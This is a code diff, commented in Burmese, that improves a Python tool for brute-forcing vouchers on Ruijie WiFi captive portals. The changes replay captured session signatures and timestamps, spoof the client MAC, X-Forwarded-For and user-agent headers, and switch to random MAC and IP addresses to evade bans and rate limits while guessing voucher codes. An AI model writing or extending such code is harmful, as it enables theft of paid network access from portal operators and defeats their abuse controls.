@@ -145,6 +145,9 @@ def activate_license(k):
     except Exception as e:
         return False, str(e)
 
+# ============================================================
+#  FIX: portal URL ကို manual input ဒါမှမဟုတ် auto capture
+# ============================================================
 def detect_and_capture():
     s = requests.Session()
     s.headers.update({
@@ -176,9 +179,21 @@ def detect_and_capture():
         except Exception:
             pass
 
-    console.print("[yellow][!] Auto-capture failed. Using default portal.[/yellow]")
+    # FIX: Auto fail ဖြစ်ရင် user ကို manual paste ခိုင်း
+    console.print("[yellow][!] Auto-capture failed.[/yellow]")
+    console.print("[yellow]    သင့် browser က portal URL ကို copy ပြီး paste ပါ[/yellow]")
+    console.print("[yellow]    (ဥပမာ: https://portal-mm-as.ruijienetworks.com/api/auth/wifidog?...)[/yellow]")
+    try:
+        manual = Prompt.ask("[bright_cyan]  ➜ Portal URL[/bright_cyan]").strip()
+        if manual:
+            return manual
+    except Exception:
+        pass
     return None
 
+# ============================================================
+#  FIX: timestamp, sign, v, ip, mac ကို portal URL ကယူ
+# ============================================================
 def build_gw_params(portal_url):
     p = {
         "stage": "portal", "gw_id": "c4b25be7d323", "gw_sn": "H1U320P00210A",
@@ -191,20 +206,22 @@ def build_gw_params(portal_url):
         return p
 
     q = parse_qs(urlparse(portal_url).query)
-    for k in ("gw_id", "gw_sn", "gw_address", "gw_port", "nasip", "slot_num",
-              "ssid", "chap_id", "chap_challenge", "stage", "ustate",
-              "mac_req", "url", "gw_mac"):
+
+    # FIX: sign, timestamp, v, ip, mac ကိုပါ ယူ
+    keys = ("gw_id", "gw_sn", "gw_address", "gw_port", "nasip", "slot_num",
+            "ssid", "chap_id", "chap_challenge", "stage", "ustate",
+            "mac_req", "url", "gw_mac", "mac", "ip",
+            "timestamp", "sign", "v")
+    for k in keys:
         if q.get(k):
             p[k] = unquote(q[k][0])
-
-    if q.get("gw_mac"):
-        p["gw_mac"] = q["gw_mac"][0]
 
     if p.get("gw_address") and p["gw_address"] not in ("192.168.7.1", ""):
         parts = p["gw_address"].split(".")
         if len(parts) == 4:
             p["nasip"] = ".".join(parts[:3] + ["1"])
 
+    # FIX: portal URL က portal-mm ဖြစ်ရင် mm base သုံး
     if "portal-mm" in portal_url:
         p["url"] = RUIJIE_MM_BASE
     else:
@@ -290,6 +307,11 @@ async def _get_with_redirects(session, url, headers, allow_redirects=True):
                [h.headers.get("Location", "") for h in r.history]
         return r.status, str(r.url), body, hist
 
+# ============================================================
+#  FIX: session fetch — sign/timestamp ပါအောင် portal URL က
+#       တကယ့် mac/ip ကို သုံး၊ v2 sign ပါတဲ့အခါ အဲဒါကို
+#       ပြန်မပြောင်းဘဲ တိုက်ရိုက် replay လုပ်
+# ============================================================
 async def fetch_real_session(session, gw_params, mac, ip, retries=2):
     errors = []
     base_candidates = []
@@ -303,12 +325,16 @@ async def fetch_real_session(session, gw_params, mac, ip, retries=2):
 
     mac = mac.lower()
 
+    # FIX: portal URL မှာ ip/mac ပါရင် အဲဒါကို ဦးစားပေး
+    use_mac = gw_params.get("mac", mac).lower()
+    use_ip = gw_params.get("ip", ip)
+
     for attempt in range(retries):
         for base in base_candidates:
             base_full = base + RUIJIE_WIFIDOG
             p = dict(gw_params)
-            p["mac"] = mac
-            p["ip"] = ip
+            p["mac"] = use_mac
+            p["ip"] = use_ip
             p["url"] = base
 
             qs = "&".join(f"{k}={quote(str(v), safe='')}" for k, v in p.items())
@@ -321,8 +347,8 @@ async def fetch_real_session(session, gw_params, mac, ip, retries=2):
                 "Accept": ("text/html,application/xhtml+xml,application/xml;"
                            "q=0.9,image/webp,*/*;q=0.8"),
                 "Accept-Language": "en-US,en;q=0.9",
-                "Client-Mac": mac,
-                "X-Forwarded-For": ip,
+                "Client-Mac": use_mac,
+                "X-Forwarded-For": use_ip,
                 "Connection": "close",
                 "Upgrade-Insecure-Requests": "1",
                 "Referer": base + "/",
@@ -362,8 +388,8 @@ async def fetch_real_session(session, gw_params, mac, ip, retries=2):
                             "timestamp": ts,
                             "logonUrl": final_u,
                             "url_base": base,
-                            "mac": mac,
-                            "ip": ip,
+                            "mac": use_mac,
+                            "ip": use_ip,
                             "acquired": time.time(),
                         })
 
@@ -389,8 +415,8 @@ async def fetch_real_session(session, gw_params, mac, ip, retries=2):
                         "timestamp": ts,
                         "logonUrl": final_url,
                         "url_base": base,
-                        "mac": mac,
-                        "ip": ip,
+                        "mac": use_mac,
+                        "ip": use_ip,
                         "acquired": time.time(),
                     })
 
@@ -407,26 +433,36 @@ async def fetch_real_session(session, gw_params, mac, ip, retries=2):
             await asyncio.sleep(0.5)
 
     return ("FAIL", "|".join(errors[:3]) or "no-session")
+# ============================================================
+#  FIX: voucher POST — session ၏ mac/ip ကို သုံး (random မဟုတ်)
+#       Referer ကို portal-mm/mobile version သုံး
+# ============================================================
 async def test_code(session, sess, code, mac, ip):
     sid = sess.get("sessionId")
     if not sid:
         return "__SESSION_EXPIRED__", "N/A"
 
     base_url = sess.get("url_base", RUIJIE_BASE).rstrip("/")
-    use_mac = sess.get("mac", mac).lower()
-    use_ip = sess.get("ip", ip)
+    use_mac = sess.get("mac", mac).lower()   # session ထဲက mac
+    use_ip = sess.get("ip", ip)              # session ထဲက ip
 
     url = base_url + RUIJIE_VOUCHER
+    # FIX: session ထဲမှာ sign/timestamp ရှိရင် voucher URL မှာ ပါဖို့
     if sess.get("sign") and sess.get("timestamp"):
         url += f"&sign={sess['sign']}&timestamp={sess['timestamp']}"
+
+    # FIX: portal-mm ဖြစ်ရင် mobile referer သုံး
+    if "portal-mm" in base_url:
+        ref_page = f"{base_url}/download/static/maccauth/src/index_mm.html?sessionId={sid}"
+    else:
+        ref_page = f"{base_url}/download/static/maccauth/src/index.html?sessionId={sid}"
 
     headers = {
         "content-type": "application/json;charset=UTF-8",
         "user-agent": ("Mozilla/5.0 (Linux; Android 12; SM-A125F) "
                        "AppleWebKit/537.36 (KHTML, like Gecko) "
                        "Chrome/120.0.0.0 Mobile Safari/537.36"),
-        "referer": (f"{base_url}/download/static/maccauth/src/index.html"
-                    f"?sessionId={sid}"),
+        "referer": ref_page,
         "Client-Mac": use_mac,
         "X-Forwarded-For": use_ip,
         "Accept": "application/json, text/plain, */*",
@@ -577,8 +613,10 @@ async def scan_loop_async(mode, length, scan_method, gw_params):
              "sess_stat": "NONE", "sess_id": "--------"}
     state_lock = threading.Lock()
 
-    mac = generate_random_mac()
-    ip = generate_random_ip()
+    # FIX: portal URL က တကယ့် mac/ip ရှိရင် အဲဒါကို သုံး (random မဟုတ်)
+    mac = gw_params.get("mac") or generate_random_mac()
+    ip = gw_params.get("ip") or generate_random_ip()
+    _portal_has_real = bool(gw_params.get("mac") and gw_params.get("ip"))
 
     main_sess = None
     main_sess_time = 0.0
@@ -604,6 +642,7 @@ async def scan_loop_async(mode, length, scan_method, gw_params):
     async def _fetch_one():
         nonlocal mac, ip
         try:
+            # FIX: portal က real mac/ip ရှိရင် မပြောင်းဘူး
             tag, payload = await fetch_real_session(session, gw_params, mac, ip, retries=2)
             return tag, payload
         except Exception as e:
@@ -646,8 +685,10 @@ async def scan_loop_async(mode, length, scan_method, gw_params):
 
             if tag == "BAN":
                 set_state(sess_stat="BANNED", status="Banned → rotate")
-                mac = generate_random_mac()
-                ip = generate_random_ip()
+                # FIX: portal real mac/ip ရှိရင် မ rotate
+                if not _portal_has_real:
+                    mac = generate_random_mac()
+                    ip = generate_random_ip()
                 await asyncio.sleep(ban_cooldown)
                 ban_cooldown = min(ban_cooldown * 1.5, 20)
                 spare_sess = None
@@ -657,8 +698,9 @@ async def scan_loop_async(mode, length, scan_method, gw_params):
             set_state(sess_stat="FAIL", status=f"Fail: {str(payload)[:30]}")
             fail_count += 1
             if fail_count >= 2:
-                mac = generate_random_mac()
-                ip = generate_random_ip()
+                if not _portal_has_real:
+                    mac = generate_random_mac()
+                    ip = generate_random_ip()
                 fail_count = 0
                 await asyncio.sleep(1.0)
             else:
@@ -744,8 +786,9 @@ async def scan_loop_async(mode, length, scan_method, gw_params):
                     if res == "__RATE_LIMITED__":
                         refresh_needed = True
                         set_state(sess_stat="BANNED", status="429 → rotate")
-                        mac = generate_random_mac()
-                        ip = generate_random_ip()
+                        if not _portal_has_real:
+                            mac = generate_random_mac()
+                            ip = generate_random_ip()
                         await asyncio.sleep(ban_cooldown)
                         ban_cooldown = min(ban_cooldown * 1.5, 20)
                         break
@@ -884,6 +927,14 @@ def run():
     portal_url = detect_and_capture()
     gw_params = build_gw_params(portal_url)
 
+    # FIX: portal URL ကို screen မှာ ပြပေး (debug)
+    console.print(f"[dim]  • base      : {gw_params.get('url')}[/dim]")
+    console.print(f"[dim]  • mac       : {gw_params.get('mac', 'random')}[/dim]")
+    console.print(f"[dim]  • ip        : {gw_params.get('ip', 'random')}[/dim]")
+    console.print(f"[dim]  • sign      : {'✓' if gw_params.get('sign') else '✗'}[/dim]")
+    console.print(f"[dim]  • timestamp : {gw_params.get('timestamp', '✗')}[/dim]")
+    time.sleep(1.5)
+
     while True:
         mode = ask_mode()
         if mode is None:
@@ -902,6 +953,7 @@ def run():
         except Exception as e:
             console.print(f"[bold red]Error: {e}[/bold red]")
             time.sleep(2)
+
 
 def main():
     try:
